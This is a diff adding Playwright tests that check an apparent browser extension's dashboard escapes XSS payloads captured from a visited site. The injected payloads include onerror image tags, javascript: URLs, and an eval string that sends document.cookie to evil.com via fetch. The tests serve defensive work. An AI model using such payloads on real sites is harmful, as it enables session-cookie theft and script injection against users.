@@ -127,4 +127,201 @@ test.describe.serial('HTML XSS 防护', () => {
         await site.close();
         await popup.close();
     });
+
+    test('eval 注入不会被执行', async () => {
+        const popup = await open_popup(fix);
+        await popup.locator('#startBtn').click();
+        await popup.waitForTimeout(500);
+
+        const site = await open_site(fix, TEST_SITES.baidu);
+        await site.waitForTimeout(2000);
+
+        // 通过 console 注入 eval payload
+        await site.evaluate(() => {
+            console.log("eval('xss')");
+            console.error("eval('fetch(\"http://evil.com/\"+document.cookie)')");
+        });
+        await site.waitForTimeout(1500);
+
+        await popup.bringToFront();
+        await popup.locator('#stopBtn').click();
+        await popup.waitForTimeout(1500);
+
+        const [dashboard] = await Promise.all([
+            fix.context.waitForEvent('page', { timeout: 10000 }),
+            popup.locator('#openDetailBtn').click(),
+        ]);
+        await dashboard.waitForLoadState('domcontentloaded');
+        await dashboard.waitForTimeout(2000);
+
+        // 验证 dashboard body 中不包含可执行的 eval 调用 ——
+        // eval 字符串应作为文本转义出现，而不应出现在内联脚本中
+        const has_eval_in_script = await dashboard.evaluate(() => {
+            const scripts = document.querySelectorAll('script:not([src])');
+            for (const s of scripts) {
+                if (s.textContent && s.textContent.includes('eval(')) return true;
+            }
+            return false;
+        });
+        expect(has_eval_in_script).toBe(false);
+
+        await dashboard.close();
+        await site.close();
+        await popup.close();
+    });
+
+    test('document.write 注入不会被执行', async () => {
+        const popup = await open_popup(fix);
+        await popup.locator('#startBtn').click();
+        await popup.waitForTimeout(500);
+
+        const site = await open_site(fix, TEST_SITES.baidu);
+        await site.waitForTimeout(2000);
+
+        // 注入 document.write payload：console + 页面内执行
+        await site.evaluate(() => {
+            console.log("document.write('<img src=x onerror=alert(1)>')");
+            try {
+                document.write('<img src=x onerror=alert(1)>');
+            } catch {
+                // document.write 在已加载页面中会覆盖文档，忽略
+            }
+        });
+        await site.waitForTimeout(1500);
+
+        await popup.bringToFront();
+        await popup.locator('#stopBtn').click();
+        await popup.waitForTimeout(1500);
+
+        const [dashboard] = await Promise.all([
+            fix.context.waitForEvent('page', { timeout: 10000 }),
+            popup.locator('#openDetailBtn').click(),
+        ]);
+        await dashboard.waitForLoadState('domcontentloaded');
+        await dashboard.waitForTimeout(2000);
+
+        // dashboard 中不应出现包含 onerror=alert 的内联脚本
+        const has_onerror_in_script = await dashboard.evaluate(() => {
+            const scripts = document.querySelectorAll('script:not([src])');
+            for (const s of scripts) {
+                const t = s.textContent || '';
+                if (t.includes('onerror') && t.includes('alert')) return true;
+            }
+            return false;
+        });
+        expect(has_onerror_in_script).toBe(false);
+
+        await dashboard.close();
+        await site.close();
+        await popup.close();
+    });
+
+    test('innerHTML 注入不会造成 DOM XSS', async () => {
+        const popup = await open_popup(fix);
+        await popup.locator('#startBtn').click();
+        await popup.waitForTimeout(500);
+
+        const site = await open_site(fix, TEST_SITES.baidu);
+        await site.waitForTimeout(2000);
+
+        // 注入 innerHTML 赋值：console 日志 + DOM 操作
+        await site.evaluate(() => {
+            console.log("document.getElementById('x').innerHTML = '<img src=x onerror=alert(1)>'");
+            // 创建一个测试元素，设置 innerHTML
+            const div = document.createElement('div');
+            div.id = 'xss_innerhtml_test';
+            div.innerHTML = '<img src=x onerror=alert(1)>';
+            document.body.appendChild(div);
+        });
+        await site.waitForTimeout(1500);
+
+        await popup.bringToFront();
+        await popup.locator('#stopBtn').click();
+        await popup.waitForTimeout(1500);
+
+        const [dashboard] = await Promise.all([
+            fix.context.waitForEvent('page', { timeout: 10000 }),
+            popup.locator('#openDetailBtn').click(),
+        ]);
+        await dashboard.waitForLoadState('domcontentloaded');
+        await dashboard.waitForTimeout(2000);
+
+        // dashboard 不应包含 innerHTML 注入产生的活动脚本或事件处理器
+        const has_innerhtml_xss = await dashboard.evaluate(() => {
+            const scripts = document.querySelectorAll('script:not([src])');
+            for (const s of scripts) {
+                const t = s.textContent || '';
+                if (t.includes('innerHTML') && t.includes('onerror')) return true;
+            }
+            return false;
+        });
+        expect(has_innerhtml_xss).toBe(false);
+
+        // 同时验证 body 中没有带 onerror 属性的 img 标签（来自注入）
+        const imgs_with_onerror = await dashboard.evaluate(() => {
+            const imgs = document.querySelectorAll('img[onerror]');
+            return imgs.length;
+        });
+        expect(imgs_with_onerror).toBe(0);
+
+        await dashboard.close();
+        await site.close();
+        await popup.close();
+    });
+
+    test('javascript: URL 不会被激活', async () => {
+        const popup = await open_popup(fix);
+        await popup.locator('#startBtn').click();
+        await popup.waitForTimeout(500);
+
+        const site = await open_site(fix, TEST_SITES.baidu);
+        await site.waitForTimeout(2000);
+
+        // 注入 javascript: 伪协议链接
+        await site.evaluate(() => {
+            // 作为用户可见内容注入 javascript: 链接
+            const a = document.createElement('a');
+            a.id = 'xss_js_url_test';
+            a.href = 'javascript:alert(1)';
+            a.textContent = 'Click me';
+            document.body.appendChild(a);
+            // 通过 console 注入
+            console.log('<a href="javascript:alert(1)">Click</a>');
+            console.log("location.href = 'javascript:alert(document.cookie)'");
+        });
+        await site.waitForTimeout(1500);
+
+        await popup.bringToFront();
+        await popup.locator('#stopBtn').click();
+        await popup.waitForTimeout(1500);
+
+        const [dashboard] = await Promise.all([
+            fix.context.waitForEvent('page', { timeout: 10000 }),
+            popup.locator('#openDetailBtn').click(),
+        ]);
+        await dashboard.waitForLoadState('domcontentloaded');
+        await dashboard.waitForTimeout(2000);
+
+        // dashboard 中不应存在可点击的 javascript: 链接（href 含有 javascript:）
+        const js_url_links = await dashboard.evaluate(() => {
+            const links = document.querySelectorAll('a[href^="javascript:"]');
+            return links.length;
+        });
+        expect(js_url_links).toBe(0);
+
+        // 同时验证内联脚本中没有 javascript: 伪协议注入
+        const has_js_url_in_script = await dashboard.evaluate(() => {
+            const scripts = document.querySelectorAll('script:not([src])');
+            for (const s of scripts) {
+                const t = s.textContent || '';
+                if (t.includes('javascript:') && t.includes('alert')) return true;
+            }
+            return false;
+        });
+        expect(has_js_url_in_script).toBe(false);
+
+        await dashboard.close();
+        await site.close();
+        await popup.close();
+    });
 });
